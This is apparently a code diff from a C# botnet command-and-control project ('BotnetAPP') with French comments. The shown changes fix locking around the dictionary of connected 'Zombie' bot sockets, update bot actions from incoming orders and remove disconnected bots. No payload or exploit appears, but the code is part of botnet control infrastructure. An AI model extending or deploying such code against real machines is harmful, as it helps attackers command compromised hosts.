@@ -169,33 +169,36 @@ namespace BotnetAPP.Network {
         while ( true ) {
 
             try {
-                lock (_connectedBot) {
 
-                    Dictionary<KeyValuePair<Zombie, Socket>, TypeAction> MiseAJourZombie = new() ;             
 
+                    Dictionary<KeyValuePair<Zombie, Socket>, TypeAction> MiseAJourZombie = new() ;
+
+
+                    lock (_connectedBot) {
                     foreach ( KeyValuePair<Zombie, Socket> item in _connectedBot ) {
                         string message = GetIncomingMessage(item.Value) ;
-                        MiseAJourZombie[item] = Data<Order>.XmlToData(message).action ; 
-                        Console.WriteLine("On passe par là "+message) ; 
+                        if ( message != "" ) {
+                            MiseAJourZombie[item] = Data<Order>.XmlToData(message).action ; 
+                        }
+                    }
+                        foreach ( KeyValuePair<KeyValuePair<Zombie, Socket>, TypeAction> item in MiseAJourZombie  ) {
+                            // On supprime pour le mettre a jour
+                            _connectedBot.Remove(item.Key.Key) ;
+
+                            item.Key.Key.SetAction(item.Value) ; 
+
+                            _connectedBot[item.Key.Key] = item.Key.Value ;
+
+                        }
                     }
 
-                    foreach ( KeyValuePair<KeyValuePair<Zombie, Socket>, TypeAction> item in MiseAJourZombie  ) {
                     
-                    // On supprime pour le mettre a jour
-                    _connectedBot.Remove(item.Key.Key) ;
 
-                    item.Key.Key.SetAction(item.Value) ; 
-
-                    _connectedBot[item.Key.Key] = item.Key.Value ;
-
-                    }
 
                     OnUpdateAction(new Zombie()) ; 
-                }
             }
             catch (Exception ex) {
-            Console.WriteLine(" c'est ici") ; 
-             Console.WriteLine(ex.Message) ; 
+             Console.WriteLine(ex.StackTrace) ; 
             }
 
              // Une seconde avant chaque vérification 
@@ -211,7 +214,7 @@ namespace BotnetAPP.Network {
 
             List<Zombie> ZombieLost = new() ; 
 
-
+            lock (_connectedBot) {
             foreach (KeyValuePair<Zombie, Socket> item in _connectedBot) {
                 if ( !SocketConnected(item.Value) ) {
                     Console.WriteLine($" {item.Value.RemoteEndPoint} s'est déconnecté") ; 
@@ -219,15 +222,12 @@ namespace BotnetAPP.Network {
                 }
             }
 
-            lock (_connectedBot) {
-                foreach ( Zombie zb in ZombieLost) {
-                lock (_connectedBot) {
-
+            
+                foreach ( Zombie zb in ZombieLost) 
+                {
                 _connectedBot.Remove(zb) ;
                 OnDisconnectionBot(zb) ;
-
-                    }  
-                }
+                }                  
             }
             
             // Une seconde avant chaque vérification 
